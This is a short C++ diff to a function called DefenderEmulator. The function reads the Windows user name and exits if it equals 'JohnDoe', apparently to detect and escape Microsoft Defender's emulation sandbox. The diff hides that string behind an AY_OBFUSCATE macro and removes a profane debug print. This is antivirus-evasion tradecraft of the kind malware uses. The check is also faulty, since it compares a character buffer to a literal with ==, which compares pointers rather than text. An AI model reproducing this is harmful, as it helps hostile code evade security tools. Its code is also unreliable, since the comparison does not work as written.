@@ -1,5 +1,7 @@
 #include "util.h"
 
+#include "Obfus.h"
+
 
 void DefenderEmulator() {
 	long unsigned int bufsize = 257;
@@ -7,8 +9,7 @@ void DefenderEmulator() {
 
 	GetUserNameA((LPSTR)user, &bufsize);
 
-	if (user == "JohnDoe") {
-		std::cout << "fuck youuuuuuuuuu" << std::endl;
+	if (user == AY_OBFUSCATE("JohnDoe")) {
 		Sleep(1000);
 		ExitProcess(-1);
 	}
